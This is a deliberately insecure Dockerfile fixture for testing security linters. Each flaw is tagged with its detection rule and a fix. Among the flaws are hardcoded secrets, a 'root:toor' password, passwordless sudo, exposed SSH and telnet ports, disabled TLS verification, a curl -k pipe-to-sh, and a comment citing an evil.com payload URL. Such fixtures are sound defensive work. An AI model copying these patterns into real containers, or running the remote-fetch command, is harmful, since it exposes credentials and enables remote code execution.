# =============================================================================
# Security Issues — Intentional Vulnerabilities for Validation Testing
# =============================================================================
# DO NOT USE IN PRODUCTION
#
# This file demonstrates SECURITY-SPECIFIC anti-patterns. Each issue is tagged
# with a severity level and the corresponding CKV/DL rule that detects it.
# =============================================================================

# [CRITICAL] :latest tag — non-reproducible, no audit trail
# CKV_DOCKER_7 | DL3007
FROM python:latest

WORKDIR /app

# [CRITICAL] Hardcoded secrets in ENV — visible via `docker history` and layer inspection
# CKV2_DOCKER_17 equivalent — secrets persist in image metadata
# FIX: Use RUN --mount=type=secret,id=db_password,env=DATABASE_PASSWORD or inject at runtime
ENV DATABASE_PASSWORD=super_secret
ENV API_TOKEN=abc123xyz789

# [CRITICAL] Hardcoded secret in ARG — also visible in docker history
# FIX: RUN --mount=type=secret,id=secret_key,env=SECRET_KEY (BuildKit 0.14+)
ARG SECRET_KEY=my_secret_key

# [HIGH] No --no-install-recommends — bloats image by ~100MB
# [HIGH] Installing dangerous packages: openssh-server (lateral movement),
#        telnet (plaintext protocol), ftp (plaintext protocol)
# [HIGH] No apt cache cleanup — /var/lib/apt/lists/* persists in layer
# [HIGH] No heredoc syntax — backslash continuation is error-prone
# DL3008 | DL3009 | DL3015 | CKV_DOCKER_1
RUN apt-get update && apt-get install -y \
    openssh-server \
    telnet \
    ftp \
    vim \
    nano

# [HIGH] ADD instead of COPY — ADD auto-extracts tars and fetches URLs
# Unexpected behavior: ADD http://evil.com/payload.tar.gz / auto-extracts
# CKV_DOCKER_4 | DL3020
# FIX: Use COPY for local files, curl/wget for remote files
ADD . /app

# [MEDIUM] No version pins — non-reproducible builds
# [MEDIUM] No --no-cache-dir — pip cache persists in layer (~50MB waste)
# DL3013 | DL3042
# FIX: pip install flask==3.1.0 requests==2.32.3 --no-cache-dir
#   or --mount=type=cache,target=/root/.cache/pip
RUN pip install flask requests sqlalchemy

# [CRITICAL] Certificate bypass examples — enables MITM attacks
# CKV2_DOCKER_2 | CKV2_DOCKER_3 | CKV2_DOCKER_4
# FIX: Use proper CA certs or --mount=type=secret for custom CAs
RUN curl -k https://example.com/setup.sh | sh
RUN wget --no-check-certificate https://example.com/binary
RUN pip install --trusted-host pypi.org some-package

# [HIGH] SSH and telnet ports — attack vectors for lateral movement
# CKV_DOCKER_1
# FIX: Only expose application ports (>1024 preferred)
EXPOSE 22
EXPOSE 23
EXPOSE 5000

# [HIGH] sudo usage — breaks audit trail, enables privilege escalation after USER
# CKV2_DOCKER_1 | DL3004
# FIX: Run privileged ops before USER directive, then drop to non-root
RUN apt-get install -y sudo && echo "appuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# [HIGH] chpasswd — embeds password hashes in image layer
# CKV2_DOCKER_17
# FIX: Never set passwords inside Dockerfile
RUN echo "root:toor" | chpasswd

# [HIGH] TLS verification disabled via environment — all HTTPS is now insecure
# CKV2_DOCKER_5 | CKV2_DOCKER_6
# FIX: Never disable TLS verification. Use proper CA certificates.
ENV PYTHONHTTPSVERIFY=0
ENV NODE_TLS_REJECT_UNAUTHORIZED=0

# [CRITICAL] No USER directive — container runs as root (UID 0)
# CKV_DOCKER_3 | CKV_DOCKER_8 | DL3002
# FIX: RUN useradd -r -u 1001 appuser && USER 1001:1001

# [HIGH] No HEALTHCHECK — orchestrator cannot detect unhealthy state
# CKV_DOCKER_2
# FIX: HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --start-interval=2s CMD [...]

# [MEDIUM] Shell-form CMD — PID 1 is /bin/sh, cannot receive SIGTERM
# DL3025
# FIX: CMD ["python", "app.py"]
CMD python app.py
